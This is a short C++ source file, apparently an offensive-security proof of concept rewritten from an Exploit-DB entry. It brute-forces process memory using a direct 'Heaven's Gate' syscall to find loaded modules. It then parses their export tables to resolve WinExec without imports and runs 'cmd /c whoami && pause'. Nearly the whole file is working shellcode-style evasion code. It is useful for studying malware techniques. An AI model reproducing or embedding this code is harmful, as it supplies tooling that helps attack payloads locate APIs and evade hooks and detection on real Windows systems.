// memBruteforce.cpp by aaaddress1@chroot.org
// brute search loaded moudules in memory
// rewrite from https://www.exploit-db.com/exploits/45293
#include <Windows.h>
#include <iostream>
#pragma warning(disable:4996)

bool isMemExist(size_t addr) {
    int retv;
    __asm {
        xor ebx, ebx
        push[addr]
        push ebx
        push ebx
        push ebx
        mov eax, 0x29              // ZwAccessCheckAndAuditAlarm
        call dword ptr fs : [0xc0] // Heaven's Gate
        add esp, 0x0c
        pop edx
        mov[retv], eax
    }
    return char(retv) != 5;
}

size_t bruteSearch_WinAPI(PCSTR apiName) {
    for (size_t addr = 0x1000; addr < 0xFF000000; addr += 0x1000)
        if (isMemExist(addr)) {

            if (PIMAGE_DOS_HEADER(addr)->e_magic == IMAGE_DOS_SIGNATURE) {
                char modulePath[MAX_PATH];
                GetModuleFileNameA(HMODULE(addr), modulePath, sizeof(modulePath));
                printf("[+] detect %s at %p\n", modulePath, addr);

                // parse export table
                auto nth = PIMAGE_NT_HEADERS(addr + PIMAGE_DOS_HEADER(addr)->e_lfanew);
                if (auto rva = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) {

                    auto eat = PIMAGE_EXPORT_DIRECTORY(addr + rva);
                    auto nameArr = PDWORD(addr + eat->AddressOfNames);
                    auto funcArr = PDWORD(addr + eat->AddressOfFunctions);
                    auto nameOrd = PWORD(addr + eat->AddressOfNameOrdinals);
                    for (size_t i = 0; i < eat->NumberOfFunctions; i++)
                        if (!stricmp(PCHAR(addr + nameArr[i]), apiName))
                            return addr + funcArr[nameOrd[i]];
                }
            }
        }
    return 0;
}

int main() {
    if (auto ptrWinExec = bruteSearch_WinAPI("WinExec"))
        (decltype(&WinExec)(ptrWinExec))("cmd /c whoami && pause", 1);
    return 0;
}